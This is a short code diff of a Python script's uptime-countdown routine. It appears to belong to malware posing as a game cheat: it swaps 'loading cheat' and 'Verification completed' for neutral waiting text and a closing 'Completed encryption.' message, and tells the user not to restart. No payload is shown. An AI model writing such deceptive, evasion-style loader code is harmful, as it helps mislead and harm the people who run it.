@@ -234,7 +234,9 @@ def check_uptime():
         print("Okay")
     else:
         time_remaining = timedelta(minutes=5) - uptime
-        os.system('cls')
+        print("INFO")
+        print("You must not restart your PC and wait for the countdown to finish.")
+
         while time_remaining.total_seconds() > 0:
             os.system('cls' if os.name == 'nt' else 'clear')
             print("")
@@ -250,14 +252,15 @@ def check_uptime():
             print("---Premium Developer: Klei")
             print("/////////////////////////////////////////////////////////////////////////////////////////////")
             minutes, seconds = divmod(int(time_remaining.total_seconds()), 60)
-            print(f"---Time remaining: {minutes} minutes and {seconds} seconds")
-            print("---loading cheat...")
+            print(f"Time remaining: {minutes} minutes and {seconds} seconds")
+            print("Please wait...")
             time.sleep(1)
             current_time = datetime.now()
             uptime = current_time - boot_time
             time_remaining = timedelta(minutes=5) - uptime
 
-        print("Verification completed!")
+        print("Completed encryption.")
+
 
 check_uptime()
 '''
